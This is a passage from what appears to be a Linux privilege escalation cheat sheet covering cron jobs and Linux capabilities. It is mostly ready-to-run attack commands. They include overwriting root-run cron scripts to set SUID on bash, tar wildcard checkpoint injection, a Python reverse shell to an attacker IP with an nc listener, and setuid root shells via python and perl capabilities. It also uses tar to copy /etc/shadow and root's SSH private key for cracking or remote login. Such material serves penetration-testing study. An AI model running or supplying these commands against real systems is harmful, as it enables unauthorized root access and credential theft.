</code></pre></div></p> <h2 id=cron-tabs-scheduled-tasks><strong>Cron Tabs &amp; Scheduled Tasks</strong><a class=headerlink href=#cron-tabs-scheduled-tasks title="Permanent link">&para;</a></h2> <p>Cron jobs is a time-based job scheduler in Unix-like computer operating systems. Users that set up and maintain software environments use cron to schedule jobs to run periodically at fixed times, dates, or intervals</p> <p>Enumeration</p> <p><div class=highlight><pre><span></span><code><a id=__codelineno-52-1 name=__codelineno-52-1 href=#__codelineno-52-1></a><span class=n>contab</span> <span class=n>-l</span>
<a id=__codelineno-52-2 name=__codelineno-52-2 href=#__codelineno-52-2></a><span class=p>/</span><span class=n>etc</span><span class=p>/</span><span class=n>init</span><span class=p>.</span><span class=n>d</span>
<a id=__codelineno-52-3 name=__codelineno-52-3 href=#__codelineno-52-3></a><span class=p>/</span><span class=n>etc</span><span class=p>/</span><span class=n>cron</span><span class=p>*</span>
<a id=__codelineno-52-4 name=__codelineno-52-4 href=#__codelineno-52-4></a><span class=p>/</span><span class=n>etc</span><span class=p>/</span><span class=n>crontab</span>
<a id=__codelineno-52-5 name=__codelineno-52-5 href=#__codelineno-52-5></a><span class=p>/</span><span class=n>etc</span><span class=p>/</span><span class=n>cron</span><span class=p>.</span><span class=n>allow</span>
<a id=__codelineno-52-6 name=__codelineno-52-6 href=#__codelineno-52-6></a><span class=p>/</span><span class=n>etc</span><span class=p>/</span><span class=n>cron</span><span class=p>.</span><span class=n>d</span> 
<a id=__codelineno-52-7 name=__codelineno-52-7 href=#__codelineno-52-7></a><span class=p>/</span><span class=n>etc</span><span class=p>/</span><span class=n>cron</span><span class=p>.</span><span class=n>deny</span>
<a id=__codelineno-52-8 name=__codelineno-52-8 href=#__codelineno-52-8></a><span class=p>/</span><span class=n>etc</span><span class=p>/</span><span class=n>cron</span><span class=p>.</span><span class=n>daily</span>
<a id=__codelineno-52-9 name=__codelineno-52-9 href=#__codelineno-52-9></a><span class=p>/</span><span class=n>etc</span><span class=p>/</span><span class=n>cron</span><span class=p>.</span><span class=n>hourly</span>
<a id=__codelineno-52-10 name=__codelineno-52-10 href=#__codelineno-52-10></a><span class=p>/</span><span class=n>etc</span><span class=p>/</span><span class=n>cron</span><span class=p>.</span><span class=n>monthly</span>
<a id=__codelineno-52-11 name=__codelineno-52-11 href=#__codelineno-52-11></a><span class=p>/</span><span class=n>etc</span><span class=p>/</span><span class=n>cron</span><span class=p>.</span><span class=n>weekly</span>
</code></pre></div> Example 1</p> <p>Privilege Escalation via Nonexistent File Overwrite</p> <div class=highlight><pre><span></span><code><a id=__codelineno-53-1 name=__codelineno-53-1 href=#__codelineno-53-1></a><span class=nb>cat </span><span class=p>/</span><span class=n>etc</span><span class=p>/</span><span class=n>crontab</span>
<a id=__codelineno-53-2 name=__codelineno-53-2 href=#__codelineno-53-2></a><span class=n>Output</span> <span class=n>Example</span><span class=p>:</span> <span class=p>*</span> <span class=p>*</span> <span class=p>*</span> <span class=p>*</span> <span class=p>*</span> <span class=n>root</span> <span class=n>systemupdate</span><span class=p>.</span><span class=n>sh</span>
<a id=__codelineno-53-3 name=__codelineno-53-3 href=#__codelineno-53-3></a><span class=nb>echo </span><span class=s1>&#39;chmod +s /bin/bash&#39;</span> <span class=p>&gt;</span> <span class=p>/</span><span class=n>home</span><span class=p>/</span><span class=n>user</span><span class=p>/</span><span class=n>systemupdate</span><span class=p>.</span><span class=n>sh</span>
<a id=__codelineno-53-4 name=__codelineno-53-4 href=#__codelineno-53-4></a><span class=n>chmod</span> <span class=p>+</span><span class=n>x</span> <span class=p>/</span><span class=n>home</span><span class=p>/</span><span class=n>user</span><span class=p>/</span><span class=n>systemupdate</span><span class=p>.</span><span class=n>sh</span>
<a id=__codelineno-53-5 name=__codelineno-53-5 href=#__codelineno-53-5></a><span class=n>Wait</span> <span class=n>a</span> <span class=k>while</span>
<a id=__codelineno-53-6 name=__codelineno-53-6 href=#__codelineno-53-6></a><span class=p>/</span><span class=n>bin</span><span class=p>/</span><span class=n>bash</span> <span class=n>-p</span>
<a id=__codelineno-53-7 name=__codelineno-53-7 href=#__codelineno-53-7></a><span class=n>id</span> <span class=p>&amp;&amp;</span> <span class=n>whoami</span>
</code></pre></div> <p>Example 2</p> <p>Privilege Escalation via Root Executable Bash Script</p> <div class=highlight><pre><span></span><code><a id=__codelineno-54-1 name=__codelineno-54-1 href=#__codelineno-54-1></a><span class=nb>cat </span><span class=p>/</span><span class=n>etc</span><span class=p>/</span><span class=n>crontab</span>
<a id=__codelineno-54-2 name=__codelineno-54-2 href=#__codelineno-54-2></a><span class=n>Output</span> <span class=n>Example</span><span class=p>:</span> <span class=p>*</span> <span class=p>*</span> <span class=p>*</span> <span class=p>*</span> <span class=p>*</span> <span class=n>root</span> <span class=p>/</span><span class=n>usr</span><span class=p>/</span><span class=n>bin</span><span class=p>/</span><span class=n>local</span><span class=p>/</span><span class=n>network-test</span><span class=p>.</span><span class=n>sh</span>
<a id=__codelineno-54-3 name=__codelineno-54-3 href=#__codelineno-54-3></a><span class=nb>echo </span><span class=s2>&quot;chmod +s /bin/bash&quot;</span> <span class=p>&gt;&gt;</span> <span class=p>/</span><span class=n>usr</span><span class=p>/</span><span class=n>bin</span><span class=p>/</span><span class=n>local</span><span class=p>/</span><span class=n>network-test</span><span class=p>.</span><span class=n>sh</span>
<a id=__codelineno-54-4 name=__codelineno-54-4 href=#__codelineno-54-4></a><span class=n>Wait</span> <span class=n>a</span> <span class=k>while</span>
<a id=__codelineno-54-5 name=__codelineno-54-5 href=#__codelineno-54-5></a><span class=n>id</span> <span class=p>&amp;&amp;</span> <span class=n>whomai</span>
</code></pre></div> <p>Example 3</p> <p>Privilege Escalation via Root Executable Python Script Overwrite</p> <p>Target</p> <p><div class=highlight><pre><span></span><code><a id=__codelineno-55-1 name=__codelineno-55-1 href=#__codelineno-55-1></a><span class=nb>cat </span><span class=p>/</span><span class=n>etc</span><span class=p>/</span><span class=n>crontab</span>
<a id=__codelineno-55-2 name=__codelineno-55-2 href=#__codelineno-55-2></a><span class=n>Output</span> <span class=n>Example</span><span class=p>:</span> <span class=p>*</span> <span class=p>*</span> <span class=p>*</span> <span class=p>*</span> <span class=p>*</span> <span class=n>root</span> <span class=p>/</span><span class=n>var</span><span class=p>/</span><span class=n>www</span><span class=p>/</span><span class=n>html</span><span class=p>/</span><span class=n>web-backup</span><span class=p>.</span><span class=n>py</span>
<a id=__codelineno-55-3 name=__codelineno-55-3 href=#__codelineno-55-3></a><span class=nb>cd </span><span class=p>/</span><span class=n>var</span><span class=p>/</span><span class=n>www</span><span class=p>/</span><span class=n>html</span><span class=p>/</span>
<a id=__codelineno-55-4 name=__codelineno-55-4 href=#__codelineno-55-4></a><span class=n>vi</span> <span class=n>web-backup</span><span class=p>.</span><span class=n>py</span>
<a id=__codelineno-55-5 name=__codelineno-55-5 href=#__codelineno-55-5></a><span class=n>Add</span> <span class=n>the</span> <span class=n>below</span> <span class=n>to</span> <span class=n>the</span> <span class=n>script</span><span class=p>:</span>
<a id=__codelineno-55-6 name=__codelineno-55-6 href=#__codelineno-55-6></a>
<a id=__codelineno-55-7 name=__codelineno-55-7 href=#__codelineno-55-7></a><span class=n>import</span> <span class=n>socket</span>
<a id=__codelineno-55-8 name=__codelineno-55-8 href=#__codelineno-55-8></a><span class=n>import</span> <span class=n>subprocess</span>
<a id=__codelineno-55-9 name=__codelineno-55-9 href=#__codelineno-55-9></a><span class=n>import</span> <span class=n>os</span>
<a id=__codelineno-55-10 name=__codelineno-55-10 href=#__codelineno-55-10></a>
<a id=__codelineno-55-11 name=__codelineno-55-11 href=#__codelineno-55-11></a><span class=n>s</span><span class=p>=</span><span class=n>socket</span><span class=p>.</span><span class=n>socket</span><span class=p>(</span><span class=n>socket</span><span class=p>.</span><span class=n>AF_INET</span><span class=p>,</span><span class=n>socket</span><span class=p>.</span><span class=n>SOCK_STREAM</span><span class=p>);</span>
<a id=__codelineno-55-12 name=__codelineno-55-12 href=#__codelineno-55-12></a><span class=n>s</span><span class=p>.</span><span class=n>connect</span><span class=p>((</span><span class=s2>&quot;10.10.10.10&quot;</span><span class=p>,</span><span class=n>443</span><span class=p>));</span> 
<a id=__codelineno-55-13 name=__codelineno-55-13 href=#__codelineno-55-13></a><span class=n>os</span><span class=p>.</span><span class=n>dup2</span><span class=p>(</span><span class=n>s</span><span class=p>.</span><span class=n>fileno</span><span class=p>(),</span><span class=n>0</span><span class=p>);</span>
<a id=__codelineno-55-14 name=__codelineno-55-14 href=#__codelineno-55-14></a><span class=n>os</span><span class=p>.</span><span class=n>dup2</span><span class=p>(</span><span class=n>s</span><span class=p>.</span><span class=n>fileno</span><span class=p>(),</span><span class=n>1</span><span class=p>);</span>
<a id=__codelineno-55-15 name=__codelineno-55-15 href=#__codelineno-55-15></a><span class=n>os</span><span class=p>.</span><span class=n>dup2</span><span class=p>(</span><span class=n>s</span><span class=p>.</span><span class=n>fileno</span><span class=p>(),</span><span class=n>2</span><span class=p>);</span>
<a id=__codelineno-55-16 name=__codelineno-55-16 href=#__codelineno-55-16></a><span class=n>p</span><span class=p>=</span><span class=n>subprocess</span><span class=p>.</span><span class=n>call</span><span class=p>([</span><span class=s2>&quot;/bin/bash&quot;</span><span class=p>,</span><span class=s2>&quot;-i&quot;</span><span class=p>]);</span>
<a id=__codelineno-55-17 name=__codelineno-55-17 href=#__codelineno-55-17></a>
<a id=__codelineno-55-18 name=__codelineno-55-18 href=#__codelineno-55-18></a><span class=p>//</span> <span class=n>Replace</span> <span class=n>the</span> <span class=n>IP</span> <span class=p>&amp;</span> <span class=n>Port</span> 
<a id=__codelineno-55-19 name=__codelineno-55-19 href=#__codelineno-55-19></a>
<a id=__codelineno-55-20 name=__codelineno-55-20 href=#__codelineno-55-20></a><span class=p>//</span> <span class=n>Save</span> <span class=p>&amp;</span> <span class=n>Exit</span> <span class=n>the</span> <span class=n>Script</span>
</code></pre></div> Attacker</p> <div class=highlight><pre><span></span><code><a id=__codelineno-56-1 name=__codelineno-56-1 href=#__codelineno-56-1></a><span class=n>nc</span> <span class=n>-lvnp</span> <span class=n>443</span>
</code></pre></div> <p>OR</p> <p>Target</p> <div class=highlight><pre><span></span><code><a id=__codelineno-57-1 name=__codelineno-57-1 href=#__codelineno-57-1></a><span class=nb>cat </span><span class=p>/</span><span class=n>etc</span><span class=p>/</span><span class=n>crontab</span>
<a id=__codelineno-57-2 name=__codelineno-57-2 href=#__codelineno-57-2></a><span class=n>Output</span> <span class=n>Example</span><span class=p>:</span> <span class=p>*</span> <span class=p>*</span> <span class=p>*</span> <span class=p>*</span> <span class=p>*</span> <span class=n>root</span> <span class=p>/</span><span class=n>var</span><span class=p>/</span><span class=n>www</span><span class=p>/</span><span class=n>html</span><span class=p>/</span><span class=n>web-backup</span><span class=p>.</span><span class=n>py</span>
<a id=__codelineno-57-3 name=__codelineno-57-3 href=#__codelineno-57-3></a><span class=nb>cd </span><span class=p>/</span><span class=n>var</span><span class=p>/</span><span class=n>www</span><span class=p>/</span><span class=n>html</span><span class=p>/</span>
<a id=__codelineno-57-4 name=__codelineno-57-4 href=#__codelineno-57-4></a><span class=n>vi</span> <span class=n>web-backup</span><span class=p>.</span><span class=n>py</span>
<a id=__codelineno-57-5 name=__codelineno-57-5 href=#__codelineno-57-5></a><span class=n>Add</span> <span class=n>the</span> <span class=n>below</span> <span class=n>to</span> <span class=n>the</span> <span class=n>script</span><span class=p>:</span>
<a id=__codelineno-57-6 name=__codelineno-57-6 href=#__codelineno-57-6></a>
<a id=__codelineno-57-7 name=__codelineno-57-7 href=#__codelineno-57-7></a><span class=n>import</span> <span class=n>os</span>
<a id=__codelineno-57-8 name=__codelineno-57-8 href=#__codelineno-57-8></a>
<a id=__codelineno-57-9 name=__codelineno-57-9 href=#__codelineno-57-9></a><span class=n>os</span><span class=p>.</span><span class=n>system</span><span class=p>(</span><span class=s2>&quot;chmod +s /bin/bash&quot;</span><span class=p>)</span>
<a id=__codelineno-57-10 name=__codelineno-57-10 href=#__codelineno-57-10></a>
<a id=__codelineno-57-11 name=__codelineno-57-11 href=#__codelineno-57-11></a><span class=p>//</span> <span class=n>Save</span> <span class=p>&amp;</span> <span class=n>Exit</span> <span class=n>the</span> <span class=n>Script</span>
<a id=__codelineno-57-12 name=__codelineno-57-12 href=#__codelineno-57-12></a>
<a id=__codelineno-57-13 name=__codelineno-57-13 href=#__codelineno-57-13></a><span class=n>Wait</span> <span class=n>a</span> <span class=k>While</span>
<a id=__codelineno-57-14 name=__codelineno-57-14 href=#__codelineno-57-14></a><span class=p>/</span><span class=n>bin</span><span class=p>/</span><span class=n>bash</span> <span class=n>-p</span>
<a id=__codelineno-57-15 name=__codelineno-57-15 href=#__codelineno-57-15></a><span class=n>id</span> <span class=p>&amp;&amp;</span> <span class=n>whoami</span>
</code></pre></div> <p>Example 4</p> <p>Privilege Escalation via Tar Bash Script (WildCards)</p> <p><div class=highlight><pre><span></span><code><a id=__codelineno-58-1 name=__codelineno-58-1 href=#__codelineno-58-1></a><span class=nb>cat </span><span class=p>/</span><span class=n>etc</span><span class=p>/</span><span class=n>crontab</span>
<a id=__codelineno-58-2 name=__codelineno-58-2 href=#__codelineno-58-2></a><span class=n>Output</span> <span class=n>Example</span><span class=p>:</span> <span class=p>*</span> <span class=p>*</span> <span class=p>*</span> <span class=p>*</span> <span class=p>*</span> <span class=n>root</span> <span class=p>/</span><span class=n>usr</span><span class=p>/</span><span class=n>bin</span><span class=p>/</span><span class=n>local</span><span class=p>/</span><span class=n>mysql-db-backup</span><span class=p>.</span><span class=n>sh</span>
<a id=__codelineno-58-3 name=__codelineno-58-3 href=#__codelineno-58-3></a><span class=nb>cat </span><span class=p>/</span><span class=n>usr</span><span class=p>/</span><span class=n>bin</span><span class=p>/</span><span class=n>local</span><span class=p>/</span><span class=n>mysql-db-backup</span><span class=p>.</span><span class=n>sh</span>
<a id=__codelineno-58-4 name=__codelineno-58-4 href=#__codelineno-58-4></a><span class=n>Output</span> <span class=n>of</span> <span class=n>Script</span><span class=p>:</span>
<a id=__codelineno-58-5 name=__codelineno-58-5 href=#__codelineno-58-5></a><span class=p>--------------------------------</span>
<a id=__codelineno-58-6 name=__codelineno-58-6 href=#__codelineno-58-6></a><span class=c>#!/bin/bash</span>
<a id=__codelineno-58-7 name=__codelineno-58-7 href=#__codelineno-58-7></a>
<a id=__codelineno-58-8 name=__codelineno-58-8 href=#__codelineno-58-8></a><span class=nb>cd </span><span class=p>/</span><span class=n>var</span><span class=p>/</span><span class=n>www</span><span class=p>/</span><span class=n>html</span><span class=p>/</span>
<a id=__codelineno-58-9 name=__codelineno-58-9 href=#__codelineno-58-9></a><span class=n>tar</span> <span class=n>czf</span> <span class=p>/</span><span class=n>tmp</span><span class=p>/</span><span class=n>dbbackup</span><span class=p>.</span><span class=n>tar</span><span class=p>.</span><span class=n>gz</span> <span class=p>*</span>
<a id=__codelineno-58-10 name=__codelineno-58-10 href=#__codelineno-58-10></a><span class=p>--------------------------------</span>
<a id=__codelineno-58-11 name=__codelineno-58-11 href=#__codelineno-58-11></a><span class=nb>cd </span><span class=p>/</span><span class=n>var</span><span class=p>/</span><span class=n>www</span><span class=p>/</span><span class=n>html</span><span class=p>/</span>
<a id=__codelineno-58-12 name=__codelineno-58-12 href=#__codelineno-58-12></a><span class=nb>echo </span><span class=s2>&quot;#!/bin/bash&quot;</span> <span class=p>&gt;</span> <span class=n>priv</span><span class=p>.</span><span class=n>sh</span>
<a id=__codelineno-58-13 name=__codelineno-58-13 href=#__codelineno-58-13></a><span class=nb>echo </span><span class=s2>&quot;chmod +s /bin/bash&quot;</span> <span class=p>&gt;&gt;</span> <span class=n>priv</span><span class=p>.</span><span class=n>sh</span>
<a id=__codelineno-58-14 name=__codelineno-58-14 href=#__codelineno-58-14></a><span class=n>chmod</span> <span class=p>+</span><span class=n>x</span> <span class=n>priv</span><span class=p>.</span><span class=n>sh</span>
<a id=__codelineno-58-15 name=__codelineno-58-15 href=#__codelineno-58-15></a><span class=n>touch</span> <span class=p>/</span><span class=n>var</span><span class=p>/</span><span class=n>www</span><span class=p>/</span><span class=n>html</span><span class=p>/-</span><span class=n>-checkpoint</span><span class=p>=</span><span class=n>1</span>
<a id=__codelineno-58-16 name=__codelineno-58-16 href=#__codelineno-58-16></a><span class=n>touch</span> <span class=p>/</span><span class=n>var</span><span class=p>/</span><span class=n>www</span><span class=p>/</span><span class=n>html</span><span class=p>/-</span><span class=n>-checkpoint-action</span><span class=p>=</span><span class=n>exec</span><span class=p>=</span><span class=n>sh</span><span class=p>\</span> <span class=n>priv</span><span class=p>.</span><span class=n>sh</span>
<a id=__codelineno-58-17 name=__codelineno-58-17 href=#__codelineno-58-17></a><span class=n>Wait</span> <span class=n>a</span> <span class=k>while</span>
<a id=__codelineno-58-18 name=__codelineno-58-18 href=#__codelineno-58-18></a><span class=p>/</span><span class=n>bin</span><span class=p>/</span><span class=n>bash</span> <span class=n>-p</span>
<a id=__codelineno-58-19 name=__codelineno-58-19 href=#__codelineno-58-19></a><span class=n>id</span> <span class=p>&amp;&amp;</span> <span class=n>whomai</span>
</code></pre></div> Example 5</p> <p>Privilege Escalation via Tar Cron Job</p> <div class=highlight><pre><span></span><code><a id=__codelineno-59-1 name=__codelineno-59-1 href=#__codelineno-59-1></a><span class=nb>cat </span><span class=p>/</span><span class=n>etc</span><span class=p>/</span><span class=n>crontab</span>
<a id=__codelineno-59-2 name=__codelineno-59-2 href=#__codelineno-59-2></a><span class=n>Output</span> <span class=n>Example</span><span class=p>:</span> <span class=p>*/</span><span class=n>1</span> <span class=p>*</span>   <span class=p>*</span> <span class=p>*</span> <span class=p>*</span>   <span class=n>root</span> <span class=n>tar</span> <span class=n>-zcf</span> <span class=p>/</span><span class=n>var</span><span class=p>/</span><span class=n>backups</span><span class=p>/</span><span class=n>html</span><span class=p>.</span><span class=n>tgz</span> <span class=p>/</span><span class=n>var</span><span class=p>/</span><span class=n>www</span><span class=p>/</span><span class=n>html</span><span class=p>/*</span>
<a id=__codelineno-59-3 name=__codelineno-59-3 href=#__codelineno-59-3></a><span class=nb>cd </span><span class=p>/</span><span class=n>var</span><span class=p>/</span><span class=n>www</span><span class=p>/</span><span class=n>html</span><span class=p>/</span>
<a id=__codelineno-59-4 name=__codelineno-59-4 href=#__codelineno-59-4></a><span class=nb>echo </span><span class=s2>&quot;chmod +s /bin/bash&quot;</span> <span class=p>&gt;</span> <span class=n>priv</span><span class=p>.</span><span class=n>sh</span>
<a id=__codelineno-59-5 name=__codelineno-59-5 href=#__codelineno-59-5></a><span class=nb>echo </span><span class=s2>&quot;&quot;</span> <span class=p>&gt;</span> <span class=s2>&quot;--checkpoint-action=exec=bash priv.sh</span>
<a id=__codelineno-59-6 name=__codelineno-59-6 href=#__codelineno-59-6></a><span class=s2>echo &quot;&quot; &gt; --checkpoint=1</span>
<a id=__codelineno-59-7 name=__codelineno-59-7 href=#__codelineno-59-7></a><span class=s2>tar cf archive.tar *</span>
<a id=__codelineno-59-8 name=__codelineno-59-8 href=#__codelineno-59-8></a>
<a id=__codelineno-59-9 name=__codelineno-59-9 href=#__codelineno-59-9></a><span class=s2>// If it does not work , replace &quot;</span><span class=n>bash</span><span class=s2>&quot; with &quot;</span><span class=n>sh</span><span class=s2>&quot;</span>
</code></pre></div> <h2 id=capabilities><strong>Capabilities</strong><a class=headerlink href=#capabilities title="Permanent link">&para;</a></h2> <p>Linux capabilities are special attributes in the Linux kernel that grant processes and binary executables specific privileges that are normally reserved for processes whose effective user ID is 0 (The root user, and only the root user, has UID 0).</p> <p>Capabilities are those permissions that divide the privileges of kernel user or kernel level programs into small pieces so that a process can be allowed sufficient power to perform specific privileged tasks.</p> <p>Essentially, the goal of capabilities is to divide the power of 'root' into specific privileges, so that if a process or binary that has one or more capability is exploited, the potential damage is limited when compared to the same process running as root.</p> <p>Capabilities can be set on processes and executable files. A process resulting from the execution of a file can gain the capabilities of that file.</p> <ul> <li>Python</li> <li>Perl</li> <li>Tar</li> <li>OpenSSL</li> </ul> <p>Python</p> <div class=highlight><pre><span></span><code><a id=__codelineno-60-1 name=__codelineno-60-1 href=#__codelineno-60-1></a><span class=n>getcap</span> <span class=n>-r</span> <span class=p>/</span> <span class=n>2</span><span class=p>&gt;/</span><span class=n>dev</span><span class=p>/</span><span class=n>null</span>         
<a id=__codelineno-60-2 name=__codelineno-60-2 href=#__codelineno-60-2></a><span class=p>/</span><span class=n>usr</span><span class=p>/</span><span class=n>bin</span><span class=p>/</span><span class=n>python2</span><span class=p>.</span><span class=n>6</span> <span class=p>=</span> <span class=n>cap_setuid</span><span class=p>+</span><span class=n>ep</span>
<a id=__codelineno-60-3 name=__codelineno-60-3 href=#__codelineno-60-3></a><span class=p>/</span><span class=n>usr</span><span class=p>/</span><span class=n>bin</span><span class=p>/</span><span class=n>python2</span><span class=p>.</span><span class=n>6</span> <span class=n>-c</span> <span class=s1>&#39;import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)&#39;</span>
<a id=__codelineno-60-4 name=__codelineno-60-4 href=#__codelineno-60-4></a><span class=n>id</span> <span class=p>&amp;&amp;</span> <span class=n>whoami</span>
<a id=__codelineno-60-5 name=__codelineno-60-5 href=#__codelineno-60-5></a>
<a id=__codelineno-60-6 name=__codelineno-60-6 href=#__codelineno-60-6></a><span class=n>OR</span>
<a id=__codelineno-60-7 name=__codelineno-60-7 href=#__codelineno-60-7></a>
<a id=__codelineno-60-8 name=__codelineno-60-8 href=#__codelineno-60-8></a><span class=n>getcap</span> <span class=n>-r</span> <span class=p>/</span> <span class=n>2</span><span class=p>&gt;/</span><span class=n>dev</span><span class=p>/</span><span class=n>null</span>  
<a id=__codelineno-60-9 name=__codelineno-60-9 href=#__codelineno-60-9></a><span class=p>/</span><span class=n>usr</span><span class=p>/</span><span class=n>bin</span><span class=p>/</span><span class=n>python3</span> <span class=p>=</span> <span class=n>cap_setuid</span><span class=p>+</span><span class=n>ep</span>
<a id=__codelineno-60-10 name=__codelineno-60-10 href=#__codelineno-60-10></a><span class=p>/</span><span class=n>usr</span><span class=p>/</span><span class=n>bin</span><span class=p>/</span><span class=n>python3</span> <span class=n>-c</span> <span class=s1>&#39;import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)&#39;</span>
<a id=__codelineno-60-11 name=__codelineno-60-11 href=#__codelineno-60-11></a><span class=n>id</span> <span class=p>&amp;&amp;</span> <span class=n>whoami</span>
</code></pre></div> <p>Perl</p> <div class=highlight><pre><span></span><code><a id=__codelineno-61-1 name=__codelineno-61-1 href=#__codelineno-61-1></a><span class=n>getcap</span> <span class=n>-r</span> <span class=p>/</span> <span class=n>2</span><span class=p>&gt;/</span><span class=n>dev</span><span class=p>/</span><span class=n>null</span>         
<a id=__codelineno-61-2 name=__codelineno-61-2 href=#__codelineno-61-2></a><span class=p>/</span><span class=n>usr</span><span class=p>/</span><span class=n>bin</span><span class=p>/</span><span class=n>perl</span> <span class=p>=</span> <span class=n>cap_setuid</span><span class=p>+</span><span class=n>ep</span>
<a id=__codelineno-61-3 name=__codelineno-61-3 href=#__codelineno-61-3></a><span class=p>/</span><span class=n>usr</span><span class=p>/</span><span class=n>bin</span><span class=p>/</span><span class=n>perl</span> <span class=n>-e</span> <span class=s1>&#39;use POSIX (setuid); POSIX::setuid(0); exec &quot;/bin/bash&quot;;&#39;</span>
<a id=__codelineno-61-4 name=__codelineno-61-4 href=#__codelineno-61-4></a><span class=n>id</span> <span class=p>&amp;&amp;</span> <span class=n>whoami</span>
</code></pre></div> <p>Tar</p> <p>Method 1 <div class=highlight><pre><span></span><code><a id=__codelineno-62-1 name=__codelineno-62-1 href=#__codelineno-62-1></a><span class=n>Victim</span>
<a id=__codelineno-62-2 name=__codelineno-62-2 href=#__codelineno-62-2></a>
<a id=__codelineno-62-3 name=__codelineno-62-3 href=#__codelineno-62-3></a><span class=n>getcap</span> <span class=n>-r</span> <span class=p>/</span> <span class=n>2</span><span class=p>&gt;/</span><span class=n>dev</span><span class=p>/</span><span class=n>null</span>         
<a id=__codelineno-62-4 name=__codelineno-62-4 href=#__codelineno-62-4></a><span class=p>/</span><span class=n>usr</span><span class=p>/</span><span class=n>bin</span><span class=p>/</span><span class=n>tar</span> <span class=p>=</span> <span class=n>cap</span> <span class=n>dac</span> <span class=n>read</span> <span class=n>search</span><span class=p>+</span><span class=n>ep</span>
<a id=__codelineno-62-5 name=__codelineno-62-5 href=#__codelineno-62-5></a><span class=p>/</span><span class=n>usr</span><span class=p>/</span><span class=n>bin</span><span class=p>/</span><span class=n>tar</span> <span class=n>-cvf</span> <span class=n>shadow</span><span class=p>.</span><span class=n>tar</span> <span class=p>/</span><span class=n>etc</span><span class=p>/</span><span class=n>shadow</span>
<a id=__codelineno-62-6 name=__codelineno-62-6 href=#__codelineno-62-6></a><span class=p>/</span><span class=n>usr</span><span class=p>/</span><span class=n>bin</span><span class=p>/</span><span class=n>tar</span> <span class=n>-xvf</span> <span class=n>shadow</span><span class=p>.</span><span class=n>tar</span>
<a id=__codelineno-62-7 name=__codelineno-62-7 href=#__codelineno-62-7></a><span class=nb>cat </span><span class=n>etc</span><span class=p>/</span><span class=n>shadow</span>
<a id=__codelineno-62-8 name=__codelineno-62-8 href=#__codelineno-62-8></a><span class=nb>Copy </span><span class=n>content</span> <span class=n>of</span> <span class=n>users</span> <span class=n>accounts</span> <span class=n>to</span> <span class=n>a</span> <span class=n>local</span> <span class=n>file</span> <span class=n>called</span> <span class=n>shadow</span>
<a id=__codelineno-62-9 name=__codelineno-62-9 href=#__codelineno-62-9></a>
<a id=__codelineno-62-10 name=__codelineno-62-10 href=#__codelineno-62-10></a><span class=n>Attacker</span>
<a id=__codelineno-62-11 name=__codelineno-62-11 href=#__codelineno-62-11></a>
<a id=__codelineno-62-12 name=__codelineno-62-12 href=#__codelineno-62-12></a><span class=n>john</span> <span class=n>shadow</span> <span class=p>-</span><span class=n>-wordlist</span><span class=p>=/</span><span class=n>usr</span><span class=p>/</span><span class=n>share</span><span class=p>/</span><span class=n>wordlists</span><span class=p>/</span><span class=n>rockyou</span><span class=p>.</span><span class=n>txt</span>
<a id=__codelineno-62-13 name=__codelineno-62-13 href=#__codelineno-62-13></a><span class=n>Crack</span> <span class=n>root</span><span class=err>&#39;</span><span class=n>s</span> <span class=n>credentials</span>
<a id=__codelineno-62-14 name=__codelineno-62-14 href=#__codelineno-62-14></a>
<a id=__codelineno-62-15 name=__codelineno-62-15 href=#__codelineno-62-15></a><span class=n>Victim</span>
<a id=__codelineno-62-16 name=__codelineno-62-16 href=#__codelineno-62-16></a>
<a id=__codelineno-62-17 name=__codelineno-62-17 href=#__codelineno-62-17></a><span class=n>su</span> <span class=n>root</span>
<a id=__codelineno-62-18 name=__codelineno-62-18 href=#__codelineno-62-18></a><span class=n>id</span> <span class=p>&amp;&amp;</span> <span class=n>whoami</span>
</code></pre></div> Method 2</p> <div class=highlight><pre><span></span><code><a id=__codelineno-63-1 name=__codelineno-63-1 href=#__codelineno-63-1></a><span class=n>Victim</span>
<a id=__codelineno-63-2 name=__codelineno-63-2 href=#__codelineno-63-2></a>
<a id=__codelineno-63-3 name=__codelineno-63-3 href=#__codelineno-63-3></a><span class=n>getcap</span> <span class=n>-r</span> <span class=p>/</span> <span class=n>2</span><span class=p>&gt;/</span><span class=n>dev</span><span class=p>/</span><span class=n>null</span>         
<a id=__codelineno-63-4 name=__codelineno-63-4 href=#__codelineno-63-4></a><span class=p>/</span><span class=n>usr</span><span class=p>/</span><span class=n>bin</span><span class=p>/</span><span class=n>tar</span> <span class=p>=</span> <span class=n>cap</span> <span class=n>dac</span> <span class=n>read</span> <span class=n>search</span><span class=p>+</span><span class=n>ep</span>
<a id=__codelineno-63-5 name=__codelineno-63-5 href=#__codelineno-63-5></a><span class=p>/</span><span class=n>usr</span><span class=p>/</span><span class=n>bin</span><span class=p>/</span><span class=n>tar</span> <span class=n>-cvf</span> <span class=n>key</span><span class=p>.</span><span class=n>tar</span> <span class=p>/</span><span class=n>root</span><span class=p>/.</span><span class=n>ssh</span><span class=p>/</span><span class=n>id_rsa</span>
<a id=__codelineno-63-6 name=__codelineno-63-6 href=#__codelineno-63-6></a><span class=p>/</span><span class=n>usr</span><span class=p>/</span><span class=n>bin</span><span class=p>/</span><span class=n>tar</span> <span class=n>-xvf</span> <span class=n>key</span><span class=p>.</span><span class=n>tar</span>
<a id=__codelineno-63-7 name=__codelineno-63-7 href=#__codelineno-63-7></a><span class=nb>cat </span><span class=n>id_rsa</span>
<a id=__codelineno-63-8 name=__codelineno-63-8 href=#__codelineno-63-8></a><span class=c># Download id_rsa to attacker machine</span>
<a id=__codelineno-63-9 name=__codelineno-63-9 href=#__codelineno-63-9></a>
<a id=__codelineno-63-10 name=__codelineno-63-10 href=#__codelineno-63-10></a><span class=n>Attacker</span>
<a id=__codelineno-63-11 name=__codelineno-63-11 href=#__codelineno-63-11></a>
<a id=__codelineno-63-12 name=__codelineno-63-12 href=#__codelineno-63-12></a><span class=n>chmod</span> <span class=n>600</span> <span class=n>id_rsa</span>
<a id=__codelineno-63-13 name=__codelineno-63-13 href=#__codelineno-63-13></a><span class=n>ssh</span> <span class=n>-i</span> <span class=n>id_rsa</span> <span class=n>root</span><span class=p>@&lt;</span><span class=n>victim_ip</span><span class=p>&gt;</span>
<a id=__codelineno-63-14 name=__codelineno-63-14 href=#__codelineno-63-14></a><span class=n>id</span> <span class=p>&amp;&amp;</span> <span class=n>whoami</span>
